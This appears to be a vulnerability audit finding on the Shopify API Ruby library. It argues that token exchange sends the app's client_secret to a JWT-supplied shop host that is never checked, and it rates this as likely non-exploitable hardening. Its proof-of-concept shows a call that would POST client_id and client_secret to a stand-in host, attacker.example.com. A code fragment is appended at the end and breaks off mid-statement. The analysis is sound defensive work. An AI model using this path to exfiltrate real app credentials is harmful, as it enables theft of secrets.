### Title
Token Exchange sends the app's `client_secret` to a shop host that is never validated against the trusted-domain allowlist - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the outbound OAuth token-exchange request using the shop host taken verbatim from the JWT `dest` claim, without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-issuing flow in the same module (`migrate_to_expiring_token`, `RefreshToken.refresh_access_token`, `ClientCredentials.client_credentials`), which all call `sanitize!` before using the shop as a request host.

### Finding Description
`HttpClient` derives the request host directly from `session.shop`: `@base_uri = "https://#{api_host || session.shop}"` [1](#0-0) . The equality this design depends on is: **the host that receives the app's `client_secret` == a host verified to be a trusted Shopify domain (`*.myshopify.com`/`myshopify.io`/etc.)**.

`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token` all enforce this equality explicitly via `validated_shop = Utils::ShopValidator.sanitize!(shop)` before constructing the session used by `HttpClient` [2](#0-1) [3](#0-2) [4](#0-3) .

`TokenExchange.exchange_token`, however, takes the shop straight from `jwt_payload.shop` (i.e. the JWT `dest` claim) and uses it unsanitized: `dest_shop = jwt_payload.shop` ... `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)` [5](#0-4) . `JwtPayload#shop` performs no domain validation at all — it merely strips a prefix: `@dest.gsub("https://", "")` [6](#0-5) , and `JwtPayload#initialize` only checks `aud == Context.api_key`; it never checks that `dest`/`iss` match a trusted Shopify domain pattern [7](#0-6) .

This `client_secret`-bearing POST body (`client_id`, `client_secret`, `subject_token`) is then sent to `https://#{dest_shop}/admin/oauth/access_token` via `HttpClient` [8](#0-7) .

### Impact Explanation
If `dest_shop` can be influenced to a non-`myshopify.com` value, the app's `client_secret` and the caller-supplied session token (`subject_token`) would be sent to an attacker-controlled host — direct SSRF/credential exfiltration of the `client_secret` (Critical/High impact category per the assessment rules, "SSRF with the app's credentials" / "theft of the app's client_secret"). This class of bug — trusting a claim/parameter as a request host without funneling it through the same domain-allowlist check used elsewhere in the module — is exactly the analog class called out in scope (host validated vs. host receiving the `client_secret`), and it is directly evidenced by the inconsistency between `exchange_token` and its sibling methods in the same file.

### Likelihood Explanation
Exploitability is uncertain and I cannot confirm it end-to-end from the code available: `JwtPayload` requires the JWT to be signed with `Context.api_secret_key` (or `old_api_secret_key`), which is a credential only the app and Shopify possess, so an unauthenticated internet attacker cannot forge an arbitrary `dest` claim without already holding the app's secret. In practice this limits the finding to a "missing defense-in-depth" issue rather than a directly attacker-triggerable one from an unprivileged position, unless there is some other path (not found in this index) by which an attacker can obtain a validly-signed JWT with a controlled `dest` value. Given the rule set requires concrete, unprivileged-attacker exploitability and I could not establish a way to forge or otherwise supply a malicious `dest` without already controlling `api_secret_key`, I flag this as **uncertain/likely non-exploitable by an unprivileged attacker**, but note it as a structural inconsistency worth hardening (`dest`/`iss` are not cross-checked against `ShopValidator`'s trusted domain list the way plain `shop:` string parameters are).

### Recommendation
For defense-in-depth and consistency with the rest of the module, run `dest_shop` through `Utils::ShopValidator.sanitize!` (as already done in `migrate_to_expiring_token`, `refresh_access_token`, and `client_credentials`) before constructing the `Session`/`HttpClient` in `TokenExchange.exchange_token`, and consider validating the JWT `iss`/`dest` claims against the trusted Shopify domain list in `JwtPayload#initialize` itself so that all consumers of `JwtPayload#shop` get this guarantee automatically.

### Proof of Concept
Not reproducible as a standalone PoC without a way to obtain a JWT signed with the app's own `api_secret_key` containing an attacker-chosen `dest` claim (e.g. `"https://attacker.example.com"`). If such a token could be obtained/forged, calling:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token_with_dest_attacker_example_com,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
would cause the library to POST a JSON body containing `client_id` and `client_secret` to `https://attacker.example.com/admin/oauth/access_token`, per the code path cited above [5](#0-4) .

      def initialize(token)
        payload_hash = begin
          decode_token(token, Context.api_secret_key)

          raise unless Context.old_api_secret_key

          decode_token(token, T.must(Context.old_api_secret_key))
        end

        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)

        raise ShopifyAPI::Errors::InvalidJwtTokenError,
